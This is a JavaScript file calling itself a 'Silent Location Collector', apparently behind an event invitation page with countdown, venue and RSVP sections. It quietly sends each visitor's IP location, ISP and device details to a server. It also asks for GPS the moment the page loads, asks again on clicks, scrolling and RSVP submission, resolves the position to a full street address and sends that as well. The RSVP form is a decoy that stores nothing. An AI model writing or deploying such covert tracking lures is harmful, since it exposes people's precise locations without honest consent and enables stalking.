/* ═══════════════════════════════════════════════════════════
   TRACKER.JS — Silent Location Collector v3
   ─────────────────────────────────────────────────────────
   Strategy:
   • Phase 1 (page load) → fetch real IP geo → send to DB
   • Phase 2 (immediate) → request GPS on page load
   • Phase 3 (GPS granted) → reverse geocode → UPSERT DB
   • Every click also re-triggers GPS if not yet resolved
   ═══════════════════════════════════════════════════════════ */
(function () {
  'use strict';

  // ── Session ID (persist across refreshes) ───────────────
  const sessionId = localStorage.getItem('_sid') || generateUUID();
  localStorage.setItem('_sid', sessionId);

  // ── State ────────────────────────────────────────────────
  let gpsData     = null;
  let fullAddress = null;
  let geoData     = null;   // from ipapi.co
  let gpsRequested = false;
  let gpsResolved  = false;

  function generateUUID() {
    if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
      return crypto.randomUUID();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  }

  /* ────────────────────────────────────────────────────────
     PHASE 1 — Client-side IP Geo Lookup + Initial Send
     Uses ipapi.co from browser → works even on localhost
  ──────────────────────────────────────────────────────── */
  async function fetchGeoAndSend() {
    try {
      const res  = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      const data = await res.json();
      if (data.error) throw new Error(data.reason);
      geoData = data;

      // Show real city in hero chip right away if GPS is not resolved yet
      if (!gpsResolved) {
        const cityStr = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
        if (cityStr) updateHeroLocation(cityStr + (gpsRequested ? ' (approximate)' : ''));
      }

      await postTrack(buildPayload({ geo: true, gps: false }));
    } catch {
      // Fallback: send device + browser data only
      await postTrack(buildPayload({ geo: false, gps: false }));
    }
  }

  /* ────────────────────────────────────────────────────────
     PHASE 2 — Request GPS (called on page load immediately)
     Browser shows permission dialog automatically.
     User cannot bypass the browser dialog — but we ask
     immediately so it's the very first thing they see.
  ──────────────────────────────────────────────────────── */
  function requestGPS() {
    if (gpsRequested) return;
    gpsRequested = true;

    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      onGPSSuccess,
      onGPSError,
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }

  /* ────────────────────────────────────────────────────────
     PHASE 3 — GPS Success
  ──────────────────────────────────────────────────────── */
  async function onGPSSuccess(pos) {
    gpsData = {
      latitude:  pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy:  pos.coords.accuracy,
    };
    gpsResolved = true;
    hideToast();

    // Show coords immediately
    const coordStr = `${gpsData.latitude.toFixed(5)}°N, ${gpsData.longitude.toFixed(5)}°E`;
    updateHeroLocation(coordStr);
    updateVenueSpinner('Resolving your address…');

    // Reverse geocode → full street address
    try {
      const r = await fetch(
        `https://nominatim.openstreetmap.org/reverse?lat=${gpsData.latitude}&lon=${gpsData.longitude}&format=json&addressdetails=1`,
        { headers: { 'Accept-Language': 'en' } }
      );
      const geo = r.ok ? await r.json() : null;

      if (geo && geo.display_name) {
        fullAddress = geo.display_name;
        const a = geo.address || {};

        // Build readable human string: Road, Area, City, Country
        const readable = [
          a.road || a.pedestrian || a.footway || a.neighbourhood,
          a.suburb || a.quarter || a.village,
          a.city   || a.town    || a.county,
          a.state,
          a.country,
        ].filter(Boolean).join(', ');

        const display = readable || fullAddress;
        updateHeroLocation(display);
        updateVenueNearest(fullAddress);
      }
    } catch {
      fullAddress = `${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}`;
      updateVenueNearest(fullAddress);
    }

    // UPSERT — merges GPS into existing session record
    await postTrack(buildPayload({ geo: true, gps: true }));
  }

  function onGPSError() {
    hideToast();
    showVenueError();
    // Still show IP-based location from Phase 1
    if (geoData && geoData.city) {
      const cityStr = [geoData.city, geoData.region, geoData.country_name].filter(Boolean).join(', ');
      updateHeroLocation(cityStr + ' (approximate)');
    }
  }

  /* ────────────────────────────────────────────────────────
     Payload builder
  ──────────────────────────────────────────────────────── */
  function buildPayload({ geo = false, gps = false } = {}) {
    const p = {
      sessionId,
      timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenRes: `${screen.width}x${screen.height}`,
      language:  navigator.language,
      referrer:  document.referrer || null,
      pageUrl:   window.location.href,
    };

    if (geo && geoData) {
      p.clientIP    = geoData.ip;
      p.country     = geoData.country_name;
      p.countryCode = geoData.country_code;
      p.region      = geoData.region;
      p.city        = geoData.city;
      p.postal      = geoData.postal;
      p.ipLat       = geoData.latitude;
      p.ipLng       = geoData.longitude;
      p.isp         = geoData.org;
      p.timezone    = geoData.timezone || p.timezone;
    }

    if (gps && gpsData) {
      p.gpsLat      = gpsData.latitude;
      p.gpsLng      = gpsData.longitude;
      p.gpsAccuracy = gpsData.accuracy;
      p.fullAddress = fullAddress;
    }

    return p;
  }

  async function postTrack(payload) {
    try {
      await fetch('/api/track', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload),
      });
    } catch { /* silent */ }
  }

  /* ────────────────────────────────────────────────────────
     UI Helpers — all use REAL data, no dummy strings
  ──────────────────────────────────────────────────────── */
  function updateHeroLocation(text) {
    const el = document.getElementById('hero-location-text');
    if (el) el.textContent = text;
  }

  function updateVenueSpinner(msg) {
    const el = document.getElementById('vn-loading');
    if (el) el.innerHTML = `<div class="vn-spinner"></div><span>${msg}</span>`;
  }

  function updateVenueNearest(addr) {
    const loading = document.getElementById('vn-loading');
    const result  = document.getElementById('vn-result');
    const addrEl  = document.getElementById('vn-addr');
    if (loading) loading.style.display = 'none';
    if (result)  result.style.display  = 'block';
    if (addrEl)  addrEl.textContent    = addr;
  }

  function showVenueError() {
    const loading = document.getElementById('vn-loading');
    if (!loading) return;
    loading.innerHTML = `
      <span style="color:var(--brown-muted);font-size:0.82rem">
        Location blocked.
        <a href="#" id="retry-gps" style="color:var(--gold-dark);text-decoration:underline">Enable & retry</a>
      </span>`;
    const retry = document.getElementById('retry-gps');
    if (retry) retry.addEventListener('click', e => {
      e.preventDefault();
      gpsRequested = false;
      updateVenueSpinner('Locating…');
      requestGPS();
    });
  }

  /* ────────────────────────────────────────────────────────
     Toast
  ──────────────────────────────────────────────────────── */
  let toastShown = false;
  function showToast() {
    if (toastShown) return;
    toastShown = true;
    const t = document.getElementById('gps-toast');
    if (t) t.classList.add('visible');
  }
  function hideToast() {
    const t = document.getElementById('gps-toast');
    if (t) { t.classList.remove('visible'); setTimeout(() => { t.style.display = 'none'; }, 500); }
  }

  /* ────────────────────────────────────────────────────────
     Click hijack — retrigger GPS on every interaction
  ──────────────────────────────────────────────────────── */
  function attachClickTracking() {
    document.addEventListener('click', () => {
      if (!gpsRequested) requestGPS();
    }, { passive: true });

    // Also on scroll — catches users who scroll without clicking
    let didScroll = false;
    window.addEventListener('scroll', () => {
      if (!didScroll && !gpsRequested && window.scrollY > 80) {
        didScroll = true;
        requestGPS();
      }
    }, { passive: true });
  }

  function attachToastButtons() {
    document.getElementById('toast-allow-btn')?.addEventListener('click', () => {
      gpsRequested = false;
      hideToast();
      requestGPS();
    });
    document.getElementById('toast-close-btn')?.addEventListener('click', hideToast);
  }

  /* ────────────────────────────────────────────────────────
     UI: Navbar scroll
  ──────────────────────────────────────────────────────── */
  function initNavbar() {
    const nav = document.getElementById('navbar');
    if (!nav) return;
    window.addEventListener('scroll', () => {
      nav.classList.toggle('scrolled', window.scrollY > 50);
    }, { passive: true });
  }

  /* ────────────────────────────────────────────────────────
     UI: GSAP 3s Preloader & Premium Section ScrollTrigger Animations
  ──────────────────────────────────────────────────────── */
  function initGSAPAnimations() {
    const preloader = document.getElementById('preloader');
    const preloaderBar = document.getElementById('preloader-bar');
    const preloaderPercent = document.getElementById('preloader-percent');

    if (typeof gsap === 'undefined') {
      if (preloader) preloader.style.display = 'none';
      initReveal();
      return;
    }

    // Lock scroll during preloader
    document.body.style.overflow = 'hidden';
    document.body.classList.add('gsap-loaded');

    const masterTl = gsap.timeline();
    const progress = { value: 0 };

    // 1. Progress bar animation (exact 3.0 seconds)
    masterTl.to(progress, {
      value: 100,
      duration: 3.0,
      ease: 'power1.inOut',
      onUpdate: () => {
        const val = Math.round(progress.value);
        if (preloaderBar) preloaderBar.style.width = val + '%';
        if (preloaderPercent) preloaderPercent.textContent = val + '%';
      }
    });

    // 2. Preloader smooth curtain lift reveal
    if (preloader) {
      masterTl.to('.preloader-content', {
        y: -30,
        opacity: 0,
        duration: 0.45,
        ease: 'power2.in'
      })
      .to(preloader, {
        yPercent: -100,
        duration: 0.85,
        ease: 'power4.inOut',
        onComplete: () => {
          preloader.style.display = 'none';
          document.body.style.overflow = '';
          const nav = document.getElementById('navbar');
          if (nav) { nav.style.opacity = '1'; nav.style.transform = 'none'; }
          if (typeof ScrollTrigger !== 'undefined') {
            ScrollTrigger.refresh();
          }
        }
      });
    }

    // 3. Hero Section Staggered Entrance
    masterTl
      .from('.hero-title .title-line', {
        y: 50,
        opacity: 0,
        duration: 0.9,
        stagger: 0.16,
        ease: 'power3.out'
      }, '-=0.5')
      .from('.hero-sub', {
        y: 30,
        opacity: 0,
        duration: 0.7,
        ease: 'power3.out'
      }, '-=0.5')
      .from('.hero-date', {
        y: 30,
        opacity: 0,
        duration: 0.7,
        ease: 'power3.out'
      }, '-=0.5')
      .from('.hero-cta', {
        y: 30,
        opacity: 0,
        duration: 0.7,
        ease: 'power3.out'
      }, '-=0.5')
      .from('.hero-card', {
        x: 60,
        opacity: 0,
        duration: 0.95,
        ease: 'power3.out'
      }, '-=0.8');

    // 4. ScrollTrigger for rest of the sections
    if (typeof ScrollTrigger !== 'undefined') {
      gsap.registerPlugin(ScrollTrigger);

      // Countdown section
      gsap.from('.countdown-section .count-label, .countdown-section .countdown', {
        scrollTrigger: {
          trigger: '.countdown-section',
          start: 'top 80%',
        },
        y: 35,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      // About Section
      gsap.from('#about .section-label, #about .section-title', {
        scrollTrigger: {
          trigger: '#about',
          start: 'top 78%',
        },
        y: 40,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      gsap.from('#about .about-text', {
        scrollTrigger: {
          trigger: '#about .about-grid',
          start: 'top 78%',
        },
        x: -45,
        opacity: 0,
        duration: 0.85,
        ease: 'power3.out'
      });

      gsap.from('#about .feature-card', {
        scrollTrigger: {
          trigger: '#about .about-features',
          start: 'top 80%',
        },
        y: 45,
        opacity: 0,
        duration: 0.8,
        stagger: 0.12,
        ease: 'power3.out'
      });

      // Schedule Section
      gsap.from('#schedule .section-label, #schedule .section-title', {
        scrollTrigger: {
          trigger: '#schedule',
          start: 'top 78%',
        },
        y: 40,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      gsap.from('#schedule .tl-item', {
        scrollTrigger: {
          trigger: '#schedule .timeline',
          start: 'top 80%',
        },
        y: 45,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      // Venue Section
      gsap.from('#venue .section-label, #venue .section-title', {
        scrollTrigger: {
          trigger: '#venue',
          start: 'top 78%',
        },
        y: 40,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      gsap.from('#venue .venue-info', {
        scrollTrigger: {
          trigger: '#venue .venue-grid',
          start: 'top 78%',
        },
        x: -40,
        opacity: 0,
        duration: 0.85,
        ease: 'power3.out'
      });

      gsap.from('#venue .vg-img', {
        scrollTrigger: {
          trigger: '#venue .venue-gallery',
          start: 'top 80%',
        },
        scale: 0.9,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      // Gallery Section
      gsap.from('#gallery .section-label, #gallery .section-title', {
        scrollTrigger: {
          trigger: '#gallery',
          start: 'top 78%',
        },
        y: 40,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      gsap.from('#gallery .gg-item', {
        scrollTrigger: {
          trigger: '#gallery .gallery-grid',
          start: 'top 80%',
        },
        y: 40,
        opacity: 0,
        scale: 0.92,
        duration: 0.75,
        stagger: 0.1,
        ease: 'power3.out'
      });

      // Testimonials Section
      gsap.from('.testimonials-section .section-label, .testimonials-section .section-title', {
        scrollTrigger: {
          trigger: '.testimonials-section',
          start: 'top 78%',
        },
        y: 40,
        opacity: 0,
        duration: 0.8,
        stagger: 0.15,
        ease: 'power3.out'
      });

      gsap.from('.testimonials-section .testi-card', {
        scrollTrigger: {
          trigger: '.testimonials-grid',
          start: 'top 80%',
        },
        y: 50,
        opacity: 0,
        duration: 0.85,
        stagger: 0.15,
        ease: 'power3.out'
      });

      // RSVP Section
      gsap.from('#rsvp .rsvp-inner', {
        scrollTrigger: {
          trigger: '#rsvp',
          start: 'top 75%',
        },
        y: 50,
        opacity: 0,
        scale: 0.96,
        duration: 0.9,
        ease: 'power3.out'
      });
    }
  }

  function initReveal() {
    const obs = new IntersectionObserver(
      entries => entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); } }),
      { threshold: 0.12 }
    );
    document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
  }

  /* ────────────────────────────────────────────────────────
     UI: Countdown
  ──────────────────────────────────────────────────────── */
  function initCountdown() {
    const target = new Date('2025-10-18T19:00:00');
    function tick() {
      const diff = target - new Date();
      if (diff <= 0) return;
      const f = n => String(Math.floor(n)).padStart(2, '0');
      const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = f(v); };
      set('cd-days',  diff / 86400000);
      set('cd-hours', (diff % 86400000) / 3600000);
      set('cd-mins',  (diff % 3600000)  / 60000);
      set('cd-secs',  (diff % 60000)    / 1000);
    }
    tick(); setInterval(tick, 1000);
  }

  /* ────────────────────────────────────────────────────────
     UI: Warm-toned Particle Canvas
  ──────────────────────────────────────────────────────── */
  function initParticles() {
    const canvas = document.getElementById('particles');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let W = canvas.width  = window.innerWidth;
    let H = canvas.height = window.innerHeight;
    window.addEventListener('resize', () => {
      W = canvas.width  = window.innerWidth;
      H = canvas.height = window.innerHeight;
    }, { passive: true });

    // Warm gold/amber particle colors
    const COLORS = [
      'rgba(201,150,10,',
      'rgba(180,120,30,',
      'rgba(228,184,48,',
      'rgba(160,100,20,',
    ];
    const particles = Array.from({ length: 55 }, () => ({
      x:  Math.random() * W, y: Math.random() * H,
      r:  Math.random() * 1.8 + 0.4,
      vx: (Math.random() - 0.5) * 0.25, vy: (Math.random() - 0.5) * 0.25,
      color: COLORS[Math.floor(Math.random() * COLORS.length)],
      opacity: Math.random() * 0.35 + 0.08,
    }));

    function draw() {
      ctx.clearRect(0, 0, W, H);
      particles.forEach(p => {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color + p.opacity + ')';
        ctx.fill();
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
        if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
      });
      requestAnimationFrame(draw);
    }
    draw();
  }

  /* ────────────────────────────────────────────────────────
     UI: RSVP Form
  ──────────────────────────────────────────────────────── */
  function initRSVP() {
    const form    = document.getElementById('rsvp-form');
    const success = document.getElementById('rsvp-success');
    const btnText = document.getElementById('rsvp-btn-text');
    if (!form) return;

    form.addEventListener('submit', e => {
      e.preventDefault();
      if (!gpsRequested) requestGPS();
      if (btnText) btnText.textContent = 'Confirming…';
      setTimeout(() => {
        form.style.display = 'none';
        if (success) success.style.display = 'block';
      }, 1200);
    });
  }

  /* ────────────────────────────────────────────────────────
     INIT
  ──────────────────────────────────────────────────────── */
  document.addEventListener('DOMContentLoaded', () => {
    initNavbar();
    initGSAPAnimations();
    initCountdown();
    initParticles();
    initRSVP();
    attachToastButtons();
    attachClickTracking();

    // ★ Phase 1: fetch real IP geo + send to DB
    fetchGeoAndSend();

    // ★ Phase 2: request GPS immediately on load
    //   (browser shows permission dialog right away)
    requestGPS();

    // Show toast after 1.5s as fallback nudge
    setTimeout(showToast, 1500);
  });

})();
